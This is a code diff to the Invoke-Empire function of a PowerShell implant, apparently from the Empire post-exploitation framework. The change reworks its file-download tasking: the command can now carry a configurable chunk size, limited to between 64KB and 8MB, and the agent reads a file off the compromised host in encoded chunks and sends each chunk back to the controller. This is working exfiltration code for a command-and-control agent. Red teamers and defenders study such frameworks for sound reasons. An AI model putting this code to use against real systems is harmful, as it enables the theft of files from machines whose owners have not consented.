@@ -668,12 +668,45 @@ function Invoke-Empire {
             }
             # file download
             elseif($type -eq 41){
-                try{
-                    $path = Get-Childitem $data | %{$_.FullName}
-                    # read in and send 512kb chunks for as long as the file has more parts
+                try {
+                    $ChunkSize = 512KB
+                    
+                    $Parts = $Data.Split(" ")
+
+                    if($Parts.Length -gt 1) {
+                        $Path = $Parts[0..($parts.length-2)] -join " "
+                        try {
+                            $ChunkSize = $Parts[-1]/1
+                            if($Parts[-1] -notlike "*b*") {
+                                # if MB/KB not specified, assume KB and adjust accordingly
+                                $ChunkSize = $ChunkSize * 1024
+                            }
+                        }
+                        catch {
+                            # if there's an error converting the last token, assume no
+                            #   chunk size is specified and add the last token onto the path
+                            $Path += " $($Parts[-1])"
+                        }
+                    }
+                    else {
+                        $Path = $Data
+                    }
+
+                    # hardcoded floor/ceiling limits
+                    if($ChunkSize -lt 64KB) {
+                        $ChunkSize = 64KB
+                    }
+                    elseif($ChunkSize -gt 8MB) {
+                        $ChunkSize = 8MB
+                    }
+
+                    # resolve the complete path
+                    $Path = Get-Childitem $Path | %{$_.FullName}
+
+                    # read in and send the specified chunk size back for as long as the file has more parts
                     $Index = 0
                     do{
-                        $EncodedPart = Get-FilePart -File "$path" -Index $Index
+                        $EncodedPart = Get-FilePart -File "$path" -Index $Index -ChunkSize $ChunkSize
                         
                         if($EncodedPart){
                             $data = "{0}|{1}|{2}" -f $Index, $path, $EncodedPart
@@ -699,7 +732,7 @@ function Invoke-Empire {
 
                     Encode-Packet -type 40 -data "[*] File download of $path completed"
                 }
-                catch{
+                catch {
                     Encode-Packet -type 0 -data "file does not exist or cannot be accessed"
                 }
             }
